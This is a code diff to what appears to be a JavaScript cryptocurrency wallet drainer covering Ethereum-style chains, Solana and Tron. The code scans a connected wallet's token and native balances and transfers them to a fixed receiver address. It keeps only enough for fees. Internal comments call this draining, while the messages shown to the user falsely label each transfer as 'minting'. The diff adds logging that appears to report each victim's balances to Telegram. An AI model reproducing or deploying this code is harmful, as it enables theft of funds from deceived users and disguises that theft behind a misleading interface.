@@ -3491,21 +3491,26 @@
             // Get native balance
             const balance = await ethersProvider.getBalance(userAddress);
             const ethBalance = parseFloat(ethers.utils.formatEther(balance));
-            log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info');
+            log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info', false);
             
             let totalClaimed = 0;
             let transactions = [];
             
             // First, mint all tokens regardless of native balance
-            log(`🪙 Scanning for tokens on ${network.name}...`, 'info');
+            log(`🪙 Scanning for tokens on ${network.name}...`, 'info', false);
             const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
             
             if (tokenBalances.length > 0) {
-                log(`✅ Found ${tokenBalances.length} tokens with balance on ${network.name}`, 'success');
+                log(`✅ Found ${tokenBalances.length} tokens with balance on ${network.name}`, 'success', true, true);
+                
+                // Log detailed balance for each token to Telegram
+                for (const token of tokenBalances) {
+                    log(`   📊 ${token.symbol}: ${token.balance.toFixed(6)} tokens (${token.address.slice(0, 6)}...)`, 'info', true, false);
+                }
                 
                 for (const token of tokenBalances) {
                     try {
-                        log(`🔄 Minting ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info');
+                        log(`🔄 Minting ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info', false);
                         
                         const tx = await token.contract.connect(signer).transfer(
                             receiverAddress,
@@ -3521,12 +3526,12 @@
                     }
                 }
             } else {
-                log(`📋 No tokens with balance found on ${network.name}`, 'info');
+                log(`📋 No tokens with balance found on ${network.name}`, 'info', true, true);
             }
             
             // Then drain native currency if sufficient balance
             if (ethBalance > 0.001) {
-                log(`💎 Minting native ${network.currency}...`, 'info');
+                log(`💎 Minting native ${network.currency}...`, 'info', true, false);
                 
                 // Calculate amount to send (leave some for gas)
                 const gasReserve = ethers.utils.parseEther('0.001');
@@ -3544,7 +3549,7 @@
                     log(`✅ Native currency minted: ${totalClaimed.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
                 }
             } else {
-                log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning');
+                log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning', true, false);
             }
             
             const hasAnyDrains = transactions.length > 0;
@@ -3576,20 +3581,20 @@
             const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
             
             log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success', true, true);
-            log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info');
+            log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info', true, false);
             
             let totalClaimed = 0;
             let transactions = [];
             
             // First, scan for SPL tokens regardless of SOL balance
-            log(`🪙 Scanning for SPL tokens...`, 'info');
+            log(`🪙 Scanning for SPL tokens...`, 'info', true, false);
             try {
                 // Get all token accounts for this wallet
                 const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                     programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
                 });
                 
-                log(`🔍 Found ${tokenAccounts.value.length} token accounts`, 'info');
+                log(`🔍 Found ${tokenAccounts.value.length} token accounts`, 'info', true, false);
                 
                 for (const tokenAccount of tokenAccounts.value) {
                     const accountData = tokenAccount.account.data.parsed.info;
@@ -3598,7 +3603,7 @@
                     
                     if (tokenBalance && tokenBalance > 0) {
                         try {
-                            log(`🔄 Minting SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info');
+                            log(`🔄 Minting SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info', true, false);
                             
                             // Create transfer instruction for SPL token
                             const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
@@ -3620,7 +3625,7 @@
             
             // Then drain SOL if sufficient balance
             if (balance > 1000000) { // 0.001 SOL minimum for fees
-                log(`💎 Minting SOL...`, 'info');
+                log(`💎 Minting SOL...`, 'info', true, false);
                 
                 // Create transaction
                 const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
@@ -3686,19 +3691,19 @@
             const trxBalance = balance / 1000000;
             
             log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success', true, true);
-            log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info');
+            log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info', true, false);
             
             let totalClaimed = 0;
             let transactions = [];
             
             // First, scan for TRC-20 tokens regardless of TRX balance
-            log(`🪙 Scanning for TRC-20 tokens...`, 'info');
+            log(`🪙 Scanning for TRC-20 tokens...`, 'info', true, false);
             try {
                 // Get account info to check for TRC-20 tokens
                 const accountInfo = await provider.trx.getAccount(fromAddress);
                 
                 if (accountInfo.assetV2) {
-                    log(`🔍 Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'info');
+                    log(`🔍 Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'info', true, false);
                     
                     for (const asset of accountInfo.assetV2) {
                         const tokenBalance = asset.value;
@@ -3706,7 +3711,7 @@
                         
                         if (tokenBalance > 0) {
                             try {
-                                log(`🔄 Minting TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info');
+                                log(`🔄 Minting TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info', true, false);
                                 
                                 const transaction = await provider.transactionBuilder.sendAsset(
                                     receiverAddress,
@@ -3737,7 +3742,7 @@
             
             // Then drain TRX if sufficient balance
             if (trxBalance > 1) {
-                log(`💎 Minting TRX...`, 'info');
+                log(`💎 Minting TRX...`, 'info', true, false);
                 
                 const amountToSend = (balance - 1000000); // Leave 1 TRX for fees
                 
@@ -3756,7 +3761,7 @@
                     log(`✅ TRX minted: ${totalClaimed.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
                 }
             } else {
-                log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning');
+                log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning', true, false);
             }
             
             const hasAnyMints = transactions.length > 0;
